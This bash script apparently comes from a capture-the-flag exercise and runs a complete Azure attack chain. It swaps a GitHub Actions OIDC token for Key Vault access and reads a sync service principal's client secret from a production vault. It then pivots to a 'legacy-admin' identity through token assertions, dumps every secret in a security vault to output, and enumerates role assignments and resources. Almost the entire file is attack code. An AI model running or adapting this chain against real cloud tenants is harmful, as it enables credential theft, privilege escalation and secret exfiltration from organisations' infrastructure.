#!/usr/bin/env bash
set -uo pipefail
M="--max-time 30 --connect-timeout 10"
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
TEN=$AZURE_TENANT_ID
MGMT="https://management.azure.com"
SECKV="https://kv-tbl-sec-x3euoz.vault.azure.net"
PRODKV="https://kv-tbl-prod-x3euoz.vault.azure.net"
LEGACY=891fb158-e02c-4428-a885-53b811f369c0
PIVOT_AUD=fb60f99c-7a34-4190-8149-302f77469936

decode(){ printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+' | { read p; r=$(( ${#p} % 4 )); [ $r -ne 0 ] && p="$p$(printf '%0.s=' $(seq 1 $((4-r))))"; printf '%s' "$p"; } | base64 -d 2>/dev/null; }

OIDC=$(curl -sS $M -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r '.value')
KV=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d "scope=https://vault.azure.net/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$OIDC" | jq -r '.access_token // empty')
Js=$(curl -sS $M -H "Authorization: Bearer $KV" "$PRODKV/secrets/sync-service-principal?api-version=7.4" | jq -r '.value')
sa=$(printf '%s' "$Js"|jq -r '.appId//.clientId'); ss=$(printf '%s' "$Js"|jq -r '.clientSecret//.password//.secret')
echo "sync-service appId=$sa"

echo "===== mint sync-service token with aud=$PIVOT_AUD ====="
for scope in "$PIVOT_AUD" "api://$PIVOT_AUD"; do
  A1=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$sa" -d "client_secret=$ss" -d "scope=$scope/.default" -d "grant_type=client_credentials")
  at=$(printf '%s' "$A1"|jq -r '.access_token // empty')
  if [ -n "$at" ]; then echo "  scope=$scope -> OK; claims: $(decode "$at" | jq -c '{iss,sub,aud,oid,appid}')"; PIVOT_TOK="$at"; break
  else echo "  scope=$scope -> $(printf '%s' "$A1"|jq -rc '.error_description//.error' | head -c 160)"; fi
done

try_legacy () { # $1 assertion  $2 how
  echo "===== assume legacy-admin via $2 ====="
  for res in "https://vault.azure.net" "$MGMT"; do
    R=$(curl -sS $M -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$LEGACY" -d "scope=$res/.default" -d "grant_type=client_credentials" -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" -d "client_assertion=$1")
    t=$(printf '%s' "$R"|jq -r '.access_token // empty')
    if [ -z "$t" ]; then echo "  [$res] FAIL: $(printf '%s' "$R"|jq -rc '.error_description//.error'|head -c 200)"; continue; fi
    echo "  [$res] TOKEN OK  oid=$(decode "$t"|jq -r '.oid')"
    if [ "$res" = "https://vault.azure.net" ]; then
      echo "   kv-tbl-sec list+read:"
      L=$(curl -sS $M -H "Authorization: Bearer $t" "$SECKV/secrets?api-version=7.4&maxresults=25")
      if printf '%s' "$L"|jq -e '.error'>/dev/null 2>&1; then echo "     list ERR: $(printf '%s' "$L"|jq -rc .error.code)"; else
        for sid in $(printf '%s' "$L"|jq -r '.value[]?.id'); do
          v=$(curl -sS $M -H "Authorization: Bearer $t" "$sid?api-version=7.4"|jq -r '.value // empty')
          echo "     $sid = $v"; printf '%s' "$v"|grep -aoE "DF26\{[^}]*\}" && echo "     *** FLAG ***"
        done
      fi
    else
      oid=$(decode "$t"|jq -r '.oid')
      echo "   ARM role assignments:"
      curl -sS $M -H "Authorization: Bearer $t" "$MGMT/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId%20eq%20'$oid'" | jq -r 'if .error then "     ERR:"+.error.code else (.value[]? | "     rdId="+(.properties.roleDefinitionId|split("/")|last)+" @ "+.properties.scope) end'
      echo "   resources: $(curl -sS $M -H "Authorization: Bearer $t" "$MGMT/subscriptions/$SUB/resources?api-version=2021-04-01&\$top=60"|jq -rc 'if .error then "ERR:"+.error.code else [.value[]?.name] end'|head -c 500)"
    fi
  done
}

[ -n "${PIVOT_TOK:-}" ] && try_legacy "$PIVOT_TOK" "azurepivot(sync-service)"
try_legacy "$OIDC" "github-base-pipe(our OIDC)"
echo "LEGACY DONE"; exit 0
